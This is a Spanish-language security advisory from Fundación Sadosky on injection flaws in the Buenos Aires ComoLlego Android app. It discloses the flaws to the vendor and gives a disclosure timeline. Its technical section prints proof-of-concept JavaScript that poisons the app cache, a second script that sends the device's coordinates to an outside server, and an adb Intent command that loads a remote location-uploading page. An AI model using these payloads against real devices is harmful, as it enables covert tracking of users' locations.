
# Vulnerabilidades en BA ComoLlego para Android


## 1. Información del reporte

**Título:** Vulnerabilidades en BA ComoLlego para Android

**Reporte ID:** STIC-2015-0126

**Reporte URL:** [http://www.fundacionsadosky.org.ar/publicaciones-2](http://www.fundacionsadosky.org.ar/publicaciones-2)

**Fecha de publicación:** 2015-03-01

**Fecha de última actualización:** 2017-01-12

**Fabricantes contactados:** Gobierno de la Ciudad de Buenos Aires

**Modo de publicación:** Coordinado



## 2. Información de vulnerabilidades

**Clase:** [Inyección de código](http://cwe.mitre.org/data/definitions/94.html)

**Impacto:** Perdida de datos

**Remotamente explotable:** Si

**Localmente explotable:** Si

**Identificador CVE:** N/A



## 3. Descripción de vulnerabilidad

La aplicación BA Como LLego [1] para Android permite consultar cómo viajar en colectivo, tren, subte, bicicleta, auto y a pie en la Ciudad de Buenos Aires, fue desarrollada por el Gobierno de la Ciudad de Buenos Aires y a enero de 2017 cuenta con entre 1 y 5 millones de instalaciones según datos del mercado de aplicaciones Google Play.
    
La aplicación fue desarrollada usando Apache Cordova [2] (conocido también como PhoneGap), un framework de código abierto que permite construir aplicaciones para dispositivos móviles a partir de tecnología web standard. El framewok embebe en la aplicación móvil un motor de navegador web (conocido como WebView) adaptado a las características del dispositivo, para que el usuario pueda visualizar el contenido de una aplicación web. Este mecanismo permite a un desarrollador incorporar a dispositivos móviles, rápidamente y con poco esfuerzo de adaptación, aplicaciones web ya existentes o desarrolladas para otras plataformas. 
     
El framework utilizado por la aplicación utiliza de WebView customizados para que un usuario pueda visualizar su contenido web. El problema de estas vistas es que para aumentar la usabilidad de la aplicación, se rompe el sandbox de un browser habitual, permitiendo que un script dentro del contenido interactúe con componentes del sistema. El framework de Cordova permite correr código Java embebido a través de interfaces definidas por el mismo. En dispositivos con versiones anteriores a 4.2, Javascript malicioso inyectado puede llegar a correr código nativo arbitrariamente.
     
Como la aplicación intenta obtener las direcciones de forma insegura, es posible inyectar Javascript malicioso por cualquier atacante en la red conectada o que se encuentre en la ruta al servidor.  
     
La configuración utilizada de PhoneGap es también insegura. Permite a la aplicación conectarse a cualquier dominio y no solo al dominio donde se encuentra el servidor, esto permite al atacante forzar a la aplicación a acceder a un servidor remoto posiblemente malicioso. 
    

## 4. Paquetes vulnerables

* Aplicación BA Como LLego para Android versiones 4.1.0 y 1.0

## 5. Información y soluciones del fabricante
 
El fabricante actualizó la aplicación el 2 de noviembre de 2015 y la versión 4.0.1 soluciona los problemas mencionados.
Sin embargo, la versión 4.1.0 publicada el 22 de diciembre de 2016 reintrodujo las vulnerabilidades
    

## 6. Créditos

Las vulnerabilidades fueron descubiertas e investigadas por Joaquin Rinaudo. La publicación de este reporte fue coordinada por Programa Seguridad en TIC. 

## 7. Descripción técnica

BA ComoLLego intenta obtener el recorrido a partir de un pedido HTTP a _http://epok.buenosaires.gob.ar/buscar/_. Este pedido devuelve un Javascript (originalmente un Callback) que se corre en el contexto de la ventana principal de la aplicación. Dado a que el pedido se realiza mediante transporte inseguro, atacantes podrían realizar Man-in-the-Middle e inyectar su propio Javascript. Inyectar código Javascript permitiría ejecutar código arbitrariamente en dispositivos con versiones corriendo anteriores a la 4.2 utilizando Java Reflection para acceder a otras clases que no sean la expuesta a través de la interface con _addJavascriptInterface_.
  
Además, dado que la aplicación obtiene algunos Javascript remotamente a partir de HTTP cuando se inicia la primera vez, se puede envenenar la caché de la aplicación para estos pedidos si se está realizando una taque de Man-in-the-Middle para mantener un acceso persistente. Por ejemplo, si a una búsqueda se le inyecta el siguiente Javascript se puede lograr que se vuelva a cargar un recurso y evitar que utilice la caché. Código inyectado en ese pedido de la librería se correrá cada vez que se abra la aplicación, logrando persistir el acceso. 
  
```
var request = new XMLHttpRequest();
request.open("GET", "http://servicios.usig.buenosaires.gov.ar/OpenLayers/2.13-dev1-1/OpenLayers.js", true);
request.setRequestHeader("Cache-Control","no-cache")
request.onreadystatechange = function() {
  if (request.readyState == 4) {
      if (request.status == 200 || request.status == 0) {
          // -> request.responseText <- is a result
      }
  }
}
request.send();

```

Así, inyectando el siguiente código en el pedido a la librería, se podría acceder a la ubicación del cliente cada vez que intente utilizar la aplicación. 
  
```
function onSuccess(position) {

        var request = new XMLHttpRequest();
        request.open("GET", "http://www.fundacionsadosky.org.ar/?lat="+position.coords.latitude+"&long="+position.coords.longitude, true);
        request.send();

    }

// onError Callback receives a PositionError object
//
function onError(error) {
    console.log('code: '    + error.code    + '\n' +
          'message: ' + error.message + '\n');
}

var watchID = navigator.geolocation.getCurrentPosition(onSuccess, onError, { timeout: 300000,enableHighAccuracy: true,maximumAge: 300000 });


```

BA ComoLLego versión 1 utiliza la versión de PhoneGap 2.3.0 que es vulnerable a CVE-2014-3500 [3] permitiendole a otras aplicaciones cambiar la página de inicio de la aplicación por una con contenido malicioso a través de un Intent que lleve un parámetro extra con referencia al contenido bajo la clave _url_. 
    
La correcta configuración del framework podría llegar a bloquear dicho ataque cuando se restringen los dominios a los cuales la aplicación se puede conectar a través del archivo de configuración _res/xml/config.xml_. Sin embargo, BA ComoLlego permite a la aplicación acceder a cualquier dominio dado a que para filtrar los accesos utiliza un comodín.
    
Como prueba de concepto que la aplicación es vulnerable a CVE-2014-3500 se puede enviar el siguiente comando a través de adb (Android Debug Bridge) que simularía ser una aplicación que envía un Intent malicioso que inyecta Javascript utilizando el módulo _Geolocation_[4] logrando que una aplicación sin permiso pueda subir remotamente la ubicación del dispositivo a un servidor remoto.
  
_adb shell am start -n ar.gob.buenosaires.comollego/.comollego --es url "https://googledrive.com/host/0B0f57xoYl_BFOG5FMEhpc3AzckU/upload_geo.html"_

## 8. Cronología del reporte

* **2014-02-11:** 
          Se envió mail solicitando contacto para reportar problemas de seguridad en aplicaciones móviles
        
* **2014-02-18:** 
          Se recibió respuesta del GCBA requiriendo información para reneviarsela a quien corresponda
        
* **2014-02-18:** 
          Se envió un descripción técnica del problema.
        
* **2015-02-03:** 
          Se envió mail a Seguridad Informática del gobierno de la Ciudad de Buenos Aires, notificando de la próxima publicación del problema y solicitando que se notifique al Director General de Gobierno Electrónico y/o al Director General de Innovación y Gobierno Abierto.
        
* **2015-02-04:** 
          Se recibió respuesta de Seguridad Informática del GCBA requiriendo reporte técnico.
        
* **2015-02-06:** 
          Se envió un versión preliminar de este boletín de seguridad.
        
* **2016-12-23:** 
          El Gobierno de la Ciudad de Buenos Aires publica la versión 4.1.0 de la aplicación en Google Play
        
* **2017-01-11:** 
          Se verifica que la vulnerabilidad se re-introdujo en la versión 4.1.0.
        

## 9. Referencias

[1] [https://play.google.com/store/apps/details?id=ar.gob.buenosaires.comollego](https://play.google.com/store/apps/details?id=ar.gob.buenosaires.comollego)

[2] [http://cordova.apache.org](http://cordova.apache.org)

[3] [https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3500](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3500)

[4] [http://docs.phonegap.com/en/edge/cordova_geolocation_geolocation.md.html](http://docs.phonegap.com/en/edge/cordova_geolocation_geolocation.md.html)

## 10. Acerca Fundación Dr. Manuel Sadosky

La Fundación Dr. Manuel Sadosky es una institución público privada cuyo objetivo es favorecer la articulación entre el sistema científico – tecnológico y la estructura productiva en todo lo referido a la temática de las Tecnologías de la Información y la Comunicación (TIC). Creada a través del Decreto Nro. 678/09 del Poder Ejecutivo Nacional, la Fundación es presidida por el ministro de Ciencia, Tecnología e Innovación Productiva. Sus vicepresidentes son los presidentes de las cámaras más importantes del sector TIC: CESSI (Cámara de Empresas de Software y Servicios Informáticos) y CICOMRA (Cámara de Informática y Comunicaciones de la República Argentina). Para más información visitar: [http://www.fundacionsadosky.org.ar](http://www.fundacionsadosky.org.ar)

## 11. Derechos de autor

El contenido de este reporte tiene copyright (c) 2014-2017 Fundación Sadosky y se publica bajo la licencia Creative Commons Attribution Non-Commercial Share-Alike 4.0: [http://creativecommons.org/licenses/by-nc-sa/4.0/](http://creativecommons.org/licenses/by-nc-sa/4.0/)